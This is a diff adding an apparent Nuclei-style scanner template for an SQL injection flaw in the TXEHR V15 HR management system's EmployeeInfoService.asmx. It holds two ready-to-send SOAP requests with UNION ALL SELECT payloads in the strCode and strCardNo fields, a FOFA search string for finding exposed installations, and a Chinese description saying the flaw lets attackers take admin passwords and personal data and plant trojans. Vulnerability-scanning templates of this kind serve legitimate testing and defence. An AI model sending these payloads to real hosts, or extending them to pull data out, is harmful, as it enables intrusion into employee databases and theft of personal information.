@@ -1,0 +1,52 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Microsoft SQL
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /Service/EmployeeInfoService.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml; charset=utf-8
+          SOAPAction: "http://tempuri.org/GetEmployeeByCode"
+
+          <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+           <soap:Body>
+            <GetEmployeeByCode xmlns="http://tempuri.org/">
+             <strCode>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCode>
+            </GetEmployeeByCode>
+           </soap:Body>
+          </soap:Envelope>
+        - |
+          POST /Service/EmployeeInfoService.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml; charset=utf-8
+          SOAPAction: "http://tempuri.org/GetEmployeeByCardNo"
+
+          <?xml version="1.0" encoding="utf-8"?>
+          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+           <soap:Body>
+            <GetEmployeeByCardNo xmlns="http://tempuri.org/">
+             <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
+            </GetEmployeeByCardNo>
+           </soap:Body>
+          </soap:Envelope>
+id: tongxiangHR-TXEHR_V15_EmployeeInfoService-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Assistant/Default.aspx"
+        同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx 接口多个实例处SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入漏洞
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140987379
+    severity: high
+    tags:
+        - 同享人力资源管理系统-TXEHR V15
+        - 同享人力资源管理系统
